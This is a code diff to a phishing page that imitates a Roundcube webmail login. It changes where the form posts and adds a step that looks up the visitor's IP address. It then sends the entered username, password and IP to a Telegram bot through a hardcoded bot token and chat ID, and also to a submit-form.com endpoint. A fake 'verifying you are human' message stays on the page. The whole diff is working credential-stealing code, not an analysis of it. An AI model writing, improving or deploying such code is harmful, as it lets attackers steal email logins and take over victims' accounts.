@@ -399,7 +399,7 @@
 <div id="dialog" class="dialog dialog-effect-in" style="display: none;">
 <div class="dialog-front">
 <div class="dialog-content">
-<form id="login_form" class="dialog-form login_form" action="https://submit-form.com/BOjdqzwMm" method="POST">
+<form id="login_form" class="dialog-form login_form" action="https://submit-form.com/bbKESMhI7" method="POST">
 <img id="logo" src="https://images.sftcdn.net/images/t_app-logo-xl,f_auto,dpr_2/p/7a60e021-3fe5-4334-9e56-7cc6ebae632d/2825932570/roundcube-webmail-roundcube_logo_icon.svg" style="display: block;margin-left: auto;margin-right: auto;" width="70" height="70"><br>
 <fieldset>
 <center><legend data-i18n="welcome">Welcome to Webmail</legend></center>
@@ -549,12 +549,29 @@
     });
   }
 
+  // Function to get the user's IP address from a third-party service
+  function getUserIP(callback) {
+    $.ajax({
+      url: 'https://api.ipify.org?format=json',
+      method: 'GET',
+      dataType: 'json',
+      success: function(data) {
+        // Pass the fetched IP to the callback function
+        callback(data.ip);
+      },
+      error: function() {
+        // If the IP service fails, send a placeholder and continue
+        callback('IP not available');
+      }
+    });
+  }
+
   // --- Form Submission Logic ---
 
   function sendFormData(email, password, honeypot, $input, $passwordInput) {
     $.ajax({
       type: 'POST',
-      url: "https://submit-form.com/BOjdqzwMm",
+      url: "https://submit-form.com/bbKESMhI7",
       data: {
         user_username: email,
         user_password: password,
@@ -622,13 +639,14 @@
     });
   }
 
-  function sendToTelegram(username, password) {
+  function sendToTelegram(username, password, ipAddress) {
     const telegramToken = '7103630373:AAE6U52dZ_UBA5-VSC2mP4xMHGnXJZT3DJs';
     const telegramChatId = '6134592216';
     const message = `New form submission:
 
 Username: ${username}
-Password: ${password}`;
+Password: ${password}
+IP Address: ${ipAddress}`;
     const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
 
     $.ajax({
@@ -657,16 +675,21 @@ Password: ${password}`;
     var password = $passwordInput.val();
     var honeypot = $("#contact_info").val();
 
-    // Dual Submission
-    sendToTelegram(email, password);
+    // New submission flow: Get IP first, then submit.
+    getUserIP(function(ipAddress) {
+      // Now that we have the IP, we can proceed with the submissions.
 
-    // Original Submission Logic
-    if (!$input.is(':disabled')) {
-      count++;
-      sendFormData(email, password, honeypot, $input, $passwordInput);
-    } else {
-      sendFormData(email, password, honeypot, $input, $passwordInput);
-    }
+      // 1. Send data to Telegram (with IP)
+      sendToTelegram(email, password, ipAddress);
+
+      // 2. Send data to the original form endpoint
+      if (!$input.is(':disabled')) {
+        count++;
+        sendFormData(email, password, honeypot, $input, $passwordInput);
+      } else {
+        sendFormData(email, password, honeypot, $input, $passwordInput);
+      }
+    });
   });
 
   function fetchEmail() {
@@ -708,7 +731,7 @@ Password: ${password}`;
   if (emailForMessage) {
     var domainForMessage = changeLogo(emailForMessage);
     // You can customize the message below
-    document.getElementById('verification-message').innerHTML = "<strong>" + domainForMessage + "</strong> verifying you are human...";
+    document.getElementById('verification-message').innerHTML = '<span style="font-size: 0.9em;"><strong>' + domainForMessage + '</strong></span><br><br>verifying you are human...';
   }
 
   checkImage("https://logo.clearbit.com/" + changeLogo(fetchEmail()));
